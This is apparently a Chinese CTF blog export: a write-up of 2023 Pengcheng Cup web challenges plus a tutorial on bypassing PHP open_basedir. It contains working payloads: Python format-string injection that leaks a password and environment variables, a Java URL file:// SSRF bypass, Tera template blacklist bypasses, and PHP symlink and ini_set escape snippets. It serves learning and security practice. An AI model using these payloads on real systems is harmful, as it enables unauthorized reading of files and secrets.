class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sqlite3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha512</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, Response</span><br><span class="line"><span class="keyword">from</span> flask_limiter <span class="keyword">import</span> Limiter</span><br><span class="line"><span class="keyword">from</span> flask_limiter.util <span class="keyword">import</span> get_remote_address</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">limiter = Limiter(</span><br><span class="line">    app=app,</span><br><span class="line">    key_func=get_remote_address,</span><br><span class="line">    default_limits=[<span class="string">&quot;50000 per hour&quot;</span>],</span><br><span class="line">    storage_uri=<span class="string">&quot;memory://&quot;</span>,    <span class="comment"># 在内存中设置</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">salt = <span class="string">b&#x27;****************&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PassHash</span>(<span class="title class_ inherited__">str</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> sha512(salt + <span class="variable language_">self</span>.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> sha512(salt + <span class="variable language_">self</span>.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">con = connect(<span class="string">&quot;users.db&quot;</span>)</span><br><span class="line">cur = con.cursor()</span><br><span class="line">cur.execute(<span class="string">&quot;DROP TABLE IF EXISTS users&quot;</span>)</span><br><span class="line">cur.execute(<span class="string">&quot;CREATE TABLE users(username, passhash)&quot;</span>)</span><br><span class="line">passhash = PassHash(<span class="string">&#x27;&#x27;</span>.join(choice(<span class="string">&quot;0123456789&quot;</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)))</span><br><span class="line">cur.execute(</span><br><span class="line">    <span class="string">&quot;INSERT INTO users VALUES (?, ?)&quot;</span>,</span><br><span class="line">    (<span class="string">&quot;admin&quot;</span>, <span class="built_in">str</span>(passhash))</span><br><span class="line">)</span><br><span class="line">con.commit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@limiter.limit(<span class="params"><span class="string">&quot;1/second&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():</span><br><span class="line">    <span class="keyword">return</span> Response(<span class="built_in">open</span>(__file__).read(), mimetype=<span class="string">&quot;text/plain&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@limiter.limit(<span class="params"><span class="string">&quot;3/second&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.args <span class="keyword">or</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;index.html&quot;</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        username = request.args[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        new_pwd = PassHash(request.args[<span class="string">&quot;password&quot;</span>])</span><br><span class="line">        con = connect(<span class="string">&quot;users.db&quot;</span>)</span><br><span class="line">        cur = con.cursor()</span><br><span class="line">        res = cur.execute(</span><br><span class="line">            <span class="string">&quot;SELECT * from users WHERE username = ? AND passhash = ?&quot;</span>,</span><br><span class="line">            (username, <span class="built_in">str</span>(new_pwd))</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">if</span> res.fetchone():</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;secret.html&quot;</span>).read()</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;Sorry, we couldn&#x27;t find a user &#x27;&#123;user&#125;&#x27; with password hash &lt;code&gt;&#123;&#123;passhash&#125;&#125;&lt;/code&gt;!&quot;</span></span><br><span class="line">                .<span class="built_in">format</span>(user=username)</span><br><span class="line">                .<span class="built_in">format</span>(passhash=new_pwd)</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">10000</span>)</span><br></pre></td></tr></table></figure></li><li><p>参数化查询，无法sql注入</p></li><li><p>目的是要获取secret.html的内容，登录成功即可，无需注意admin，注意到<code>__file__</code>&#x2F;<code>index.html</code>是可以读的，是否需要后续写入？</p></li><li><p>好像没有得注册，注意到admin的passhash在全局变量中</p></li><li><p>如果没有获取文件，则在passhash处ssti?(格式字符串漏洞)获取passhash这个变量，而且这里没有过滤 -&gt; <strong>思路对了</strong>，但是flask ssti不熟sad，看题解 –&gt; <strong>没有环境本地复现不了啊，本地python跑出来不一样啊，还是学思路就好</strong></p></li><li><p>可以知道密码保存在全局的passhash对象中，利用字符串显示方法来获取</p><ol><li><p>PassHash 虽然继承了 str, 但是只重写了 <code>__str__</code> 和 <code>__repr__</code> 两个方法, 实例化时传入的 password 明文其实还保存在对象里面，要通过其他方法获取对象</p></li><li><p><strong>format获取明文</strong>:<code>username=&#123;passhash.__class__.__str__.__globals__[passhash]:&gt;0&#125;&amp;password=2</code>: <code>:&gt;0</code> 表示左对齐, 会调用父类 str 的 <code>__format__</code> 方法, 而不是 <code>__str__</code> 和 <code>__repr__</code>, 进而得到明文</p></li><li><p><strong>爆破获取明文</strong>:<code>username=&#123;passhash.__class__.__str__.__globals__[passhash][0]&#125;&amp;password=2</code></p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://localhost:5000/?username=&#123;passhash.__class__.__str__.__globals__[passhash]&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    req = requests.get(url+<span class="string">f&quot;[<span class="subst">&#123;i&#125;</span>]&quot;</span>+<span class="string">&quot;&#125;&amp;password=2&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(req.text)</span><br></pre></td></tr></table></figure></li></ol></li><li><p>登录后提示 flag 在环境变量里面</p><ol><li>ssti命令执行阶段</li><li>payload: <code>username=&#123;passhash.__str__.__globals__[app].__init__.__globals__[os].environ&#125;&amp;password=2</code></li><li>payload2: <code>&#123;passhash.__class__.__repr__.__globals__[app].__init__.__globals__[os].environ&#125;</code></li></ol></li></ol><h2 id="HTTP-java-ssrf"><a href="#HTTP-java-ssrf" class="headerlink" title="HTTP: java ssrf"></a>HTTP: java ssrf</h2><ol><li><p>dirsearch开扫，发现由api，swagger-ui泄露</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[10:26:42] Starting:</span><br><span class="line">[10:27:37] 200 -   92B  - /swagger-resources</span><br><span class="line">[10:27:41] 200 -  625B  - /v2/api-docs</span><br></pre></td></tr></table></figure></li><li><p>随后进入<code>http://172.10.0.3:8080/swagger-ui/index.html</code><br> <img src="/pic/pcb23%E5%A4%8D%E7%8E%B0/http_api.png" alt="pic"></p></li><li><p>先<code>http://x.x.xx.x/vps</code>，发现user-agent中有java版本，猜测是通过URL类发起请求，尝试以下</p><ol><li>使用ftp也能正常获取内容，但是使用file的时候被过滤了</li></ol></li><li><p>调试对应java版本的URL类，发现可以利用绕过的点</p><ol><li>最终payload: <code>url:file:///flag%23a.html</code></li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 可以提供url:作为开头，会直接跳过，不会过滤后面</span></span><br><span class="line"><span class="keyword">if</span> (spec.regionMatches(<span class="literal">true</span>, start, <span class="string">&quot;url:&quot;</span>, <span class="number">0</span>, <span class="number">4</span>)) &#123;</span><br><span class="line">            start += <span class="number">4</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 使用#后面的，可以使用#来绕过后缀检查，而且不会产生影响</span></span><br><span class="line"><span class="keyword">if</span> (start &lt; spec.length() &amp;&amp; spec.charAt(start) == <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line">     <span class="comment">/* we&#x27;re assuming this is a ref relative to the context URL.</span></span><br><span class="line"><span class="comment">      * This means protocols cannot start w/ &#x27;#&#x27;, but we must parse</span></span><br><span class="line"><span class="comment">      * ref URL&#x27;s like: &quot;hello:there&quot; w/ a &#x27;:&#x27; in them.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">     aRef=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="Tera-rust-ssti"><a href="#Tera-rust-ssti" class="headerlink" title="Tera: rust ssti"></a>Tera: rust ssti</h2><ol><li>看wp说是信息题</li><li>google找一下+文档，[<a href="https://keats.github.io/tera/docs/#built-ins]">https://keats.github.io/tera/docs/#built-ins]</a></li><li>这里说说绕过黑名单的手法吧<ol><li>拼接绕过：<code>&#123;% set fla1 = get_env(name=fla) %&#125;&#123;% set fla1 = get_env(name=fla) %&#125;</code></li><li>逆序绕过：<code>&quot;&quot;&quot;&#123;% set f='galf'|reverse %&#125;&#123;% set f1 = get_env(name=f)|reverse %&#125;&#123;% if f1 is starting_with('""" + flag + i + """') %&#125;ok&#123;% endif %&#125;&quot;&quot;&quot;</code></li></ol></li></ol><h2 id="simple-rpc-信息题略"><a href="#simple-rpc-信息题略" class="headerlink" title="simple_rpc: 信息题略"></a>simple_rpc: 信息题略</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>web02中一定要比较清楚几个判断逻辑，尤其在<code>file_get_contents()</code>这里和<strong>自动转换</strong>，最好实操一下，不要一意孤行，Array不会自动转为string，下列的转换是在<code>.</code>的作用下才</li><li>http中有时找不到文章但是知道版本情况下可以考虑看看<strong>源码的利用点</strong>，对于过滤知道是<strong>黑名单</strong>还是<strong>正则</strong>(或者是白名单)很有用</li><li>有些题目没有搜到对应的内容并且确定不是熟悉的可能就是信息题，利用<strong>一般攻击思路+对应语法的构造方法即可</strong>，文档看起来也不麻烦，一小时可以看很熟练了</li><li>像simple_rpc这种由配置版本信息的可以查查<strong>历史漏洞</strong></li></ol><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>全场最细[<a href="https://zer0peach.github.io/2024/01/15/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/]">https://zer0peach.github.io/2024/01/15/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/]</a></li><li>[<a href="https://exp10it.io/2023/11/2023-%E9%B9%8F%E5%9F%8E%E6%9D%AF-web-writeup/]">https://exp10it.io/2023/11/2023-%E9%B9%8F%E5%9F%8E%E6%9D%AF-web-writeup/]</a></li><li>HTTP<ol><li>[<a href="https://zer0peach.github.io/2024/01/15/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/#HTTP]">https://zer0peach.github.io/2024/01/15/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/#HTTP]</a></li><li>[<a href="https://www.yuque.com/dat0u/ctf/gupiindgyz7vodib#lxroJ]">https://www.yuque.com/dat0u/ctf/gupiindgyz7vodib#lxroJ]</a></li><li>[<a href="https://forum.butian.net/share/2939]">https://forum.butian.net/share/2939]</a></li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php的disable_function绕过</title>
      <link href="/2024/11/08/php%E7%9A%84disable_function%E7%BB%95%E8%BF%87/"/>
      <url>/2024/11/08/php%E7%9A%84disable_function%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php的open_basedir绕过</title>
      <link href="/2024/11/08/php%E7%9A%84open_basedir%E7%BB%95%E8%BF%87/"/>
      <url>/2024/11/08/php%E7%9A%84open_basedir%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这里侧重于目录读写，在php5.3以后很少有能够绕过open_basedir读写文件的方法(源自p牛原句)<br>很多条件都需要在linux下的php环境才可以实现，windows中phpstudy有很多搞不出来</p></blockquote><h2 id="bypass-ref"><a href="#bypass-ref" class="headerlink" title="bypass ref"></a>bypass ref</h2><ol><li><a href="http://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/">很不错，详细并且有版本信息</a></li><li><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html">p牛的补充</a></li></ol><h2 id="什么是open-basedir"><a href="#什么是open-basedir" class="headerlink" title="什么是open_basedir?"></a>什么是open_basedir?</h2><ul><li>ref<ul><li><a href="https://www.php.net/manual/en/ini.core.php">官方文档</a></li></ul></li></ul><ol><li>open_basedir是php.ini中的一个配置选项，可用于将用户访问文件的活动范围限制在指定的区域，对于目录和文件内容都生效<ol><li>使用open_basedir指定的限制是目录名，而不是前缀。</li><li>设置open_basedir的方法，在linux下，不同的目录由<code>:</code>分割，如<code>/var/www/:/tmp/</code>；在Windows下不同目录由<code>;</code>分割，如<code>c:/www;c:/windows/temp</code>。</li></ol></li><li><em><strong>对于符号链接</strong></em><ol><li>所有的符号链接都被解析，所以不可能用符号链接来避免这个限制。如果文件不存在，则无法解析符号链接，并将文件名与（已解析的）open_basedir进行比较 -&gt; 会进行解析后比较</li><li>警惕使用<code>.</code>因为脚本的工作目录可以很容易地用chdir（）更改</li></ol></li><li><em><strong>命令执行函数不怕open_basedir</strong></em> –&gt; 命令执行函数更加怕disable_functions</li></ol><h2 id="访问根目录绕过"><a href="#访问根目录绕过" class="headerlink" title="访问根目录绕过"></a>访问根目录绕过</h2><h3 id="1-原生类-DirectoryIterator-glob"><a href="#1-原生类-DirectoryIterator-glob" class="headerlink" title="1. 原生类: DirectoryIterator+glob:&#x2F;&#x2F;"></a>1. 原生类: DirectoryIterator+glob:&#x2F;&#x2F;</h3><blockquote><p>windows11 + php7.3.4 phpstudy 不可行<br>glob: 数据流包装器是从 PHP 5.3.0 起开始有效的，用来查找匹配的文件路径</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// ?c=glob:///*</span></span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-函数-opendir-readdir-glob"><a href="#2-函数-opendir-readdir-glob" class="headerlink" title="2. 函数: opendir()+readdir()+glob:&#x2F;&#x2F;"></a>2. 函数: opendir()+readdir()+glob:&#x2F;&#x2F;</h3><blockquote><p>windows11 + php7.3.4 phpstudy 不可行<br>glob: 数据流包装器是从 PHP 5.3.0 起开始有效的，用来查找匹配的文件路径</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// ?c=glob:///*;</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$b</span> = <span class="title function_ invoke__">opendir</span>(<span class="variable">$a</span>) ) &#123;</span><br><span class="line">    <span class="keyword">while</span> ( (<span class="variable">$file</span> = <span class="title function_ invoke__">readdir</span>(<span class="variable">$b</span>)) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;  <span class="comment">// 需要通过循环进行输出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">closedir</span>(<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-函数-scandir-glob"><a href="#3-函数-scandir-glob" class="headerlink" title="3. 函数: scandir()+glob:&#x2F;&#x2F;"></a>3. 函数: scandir()+glob:&#x2F;&#x2F;</h3><blockquote><p>windows11 + php7.3.4 phpstudy 不可行<br>glob: 数据流包装器是从 PHP 5.3.0 起开始有效的，用来查找匹配的文件路径</p></blockquote><ol><li>只能列出根目录和open_basedir允许目录下的文件</li><li><code>var_dump(scandir(&quot;glob:///*&quot;));</code></li></ol><h2 id="访问任意目录"><a href="#访问任意目录" class="headerlink" title="访问任意目录"></a>访问任意目录</h2><h3 id="1-函数-symlink-mkdir-chdir-unlink"><a href="#1-函数-symlink-mkdir-chdir-unlink" class="headerlink" title="1. 函数: symlink() + mkdir() + chdir() + unlink()"></a>1. 函数: symlink() + mkdir() + chdir() + unlink()</h3><blockquote><p>windows11 + php7.3.4 phpstudy 不可行<br>在windows上的unlink()函数还要看版本<br>似乎没有找到讲解原理的</p></blockquote><ol><li><p>对于普通的symlink()如<code>symlink(&quot;../../flag.txt&quot;,&quot;exp&quot;)</code>而言，open_basedir是可以进行限制的</p></li><li><p>但是通过以下payload即可进行构造访问其他目录</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;A&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&quot;A&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;B&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&quot;..&quot;</span>);</span><br><span class="line"><span class="comment">// 新建的目录深度为2，回到current/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">symlink</span>(<span class="string">&quot;A/B&quot;</span>,<span class="string">&quot;tmp&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">symlink</span>(<span class="string">&quot;tmp/../../&quot;</span>,<span class="string">&quot;exp&quot;</span>); <span class="comment">// exp指向current/A/B/../../也就是本目录，合法</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="string">&quot;tmp&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;tmp&quot;</span>);   <span class="comment">// 将tmp指向current/tmp，这是exp执行current/../</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 要向上n个目录/n个目录的文件，需要创建n+1个新目录并添加n+1个../才可以到达</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="2-函数-chdir-ini-set"><a href="#2-函数-chdir-ini-set" class="headerlink" title="2. 函数: chdir() + ini_set()"></a>2. 函数: chdir() + ini_set()</h3><ol><li>思路时通过<strong>相对</strong>的观念进行绕过</li><li>ref<ol><li><strong>一叶飘零师傅底层原理，原站关了，这里可以从github.io下载到源html</strong>，我给放到这一节的pic里md文件里，感觉还是不清晰啊</li><li><a href="https://www.163.com/dy/article/ECQSCP9E0511CJ6O.html">像是被搬运到这里，没有看懂</a> search php_check_open_basedir_ex<ol><li>expand_filepath()全身心的投入在相对路径和绝对路径，没有考虑open_basedir如果为相对路径会实时变化的问题</li></ol></li></ol></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 一句话格式</span></span><br><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;sub&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;sub&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>))</span><br><span class="line"><span class="comment">// 重点在于先mkdir(&quot;sub&quot;)再chdir(&quot;sub&quot;)这一步，可以通过..往上跳跃</span></span><br><span class="line"><span class="comment">// 最后到/根目录后再进行重新设置覆盖</span></span><br></pre></td></tr></table></figure><h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><blockquote><p>这类还是不是很推荐进行使用的，需要爆破搞个字典搞</p></blockquote><h3 id="0-对于windows-php有用的通配符脚本"><a href="#0-对于windows-php有用的通配符脚本" class="headerlink" title="0. *对于windows+php有用的通配符脚本"></a>0. *对于windows+php有用的通配符脚本</h3><blockquote><p>如果使用linux则还是需要进行暴力破解，这里说的使用的server的平台</p></blockquote><ol><li>ref<ol><li><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html">来自p牛的解释</a></li><li><a href="https://comwrg.github.io/1000php/bugs/wooyun-2014-071540">windows通配符</a></li></ol></li><li>windows+php中<ol><li>大于号(&gt;)相当于通配符问号(?)</li><li>小于号(&lt;)相当于通配符星号(*)</li><li><img src="/pic/php%E7%9A%84open_basedir%E7%BB%95%E8%BF%87/brute_with_glob.png" alt="brute with glob"></li></ol></li><li>Notice: <strong>如果首字母相同</strong>，我们只需要再枚举第二个字符、第三个字符依次类推，即可列举出目录中所有文件</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>));</span><br><span class="line"><span class="title function_ invoke__">printf</span>(<span class="string">&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;</span>, <span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;open_basedir&#x27;</span>));</span><br><span class="line"><span class="variable">$basedir</span> = <span class="string">&#x27;D:/test/&#x27;</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$chars</span>); <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="variable">$info</span> = <span class="keyword">new</span> <span class="built_in">SplFileInfo</span>(<span class="variable">$basedir</span> . <span class="variable">$chars</span>[<span class="variable">$i</span>] . <span class="string">&#x27;&lt;&gt;&lt;&#x27;</span>); <span class="comment">// 重点在于这里</span></span><br><span class="line">    <span class="variable">$re</span> = <span class="variable">$info</span>-&gt;<span class="title function_ invoke__">getRealPath</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$re</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">dump</span>(<span class="variable">$re</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dump</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$s</span> . <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">ob_flush</span>();</span><br><span class="line">    <span class="title function_ invoke__">flush</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="1-函数-bindtextdomain"><a href="#1-函数-bindtextdomain" class="headerlink" title="1. 函数: bindtextdomain()"></a>1. 函数: bindtextdomain()</h3><blockquote><p>windows下默认是没有这个函数的，而在linux下不能使用通配符进行目录的猜解，不是好选择</p></blockquote><ol><li><code>bindtextdomain(string $domain, ?string $directory): string|false</code><ol><li>利用原理是<strong>基于报错</strong>：bindtextdomain()函数的第二个参数$directory是一个文件路径，它会在$directory存在的时候返回$directory，不存在则返回false –&gt; <strong>盲注</strong></li></ol></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bindtextdomain</span></span><br><span class="line"><span class="variable">$re</span> = <span class="title function_ invoke__">bindtextdomain</span>(<span class="string">&#x27;xxx&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;dir&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$re</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-原生类-SplFileInfo-getRealPath"><a href="#2-原生类-SplFileInfo-getRealPath" class="headerlink" title="2. 原生类: SplFileInfo::getRealPath()"></a>2. 原生类: SplFileInfo::getRealPath()</h3><blockquote><p>(PHP 5 &gt;&#x3D; 5.1.2, PHP 7, PHP 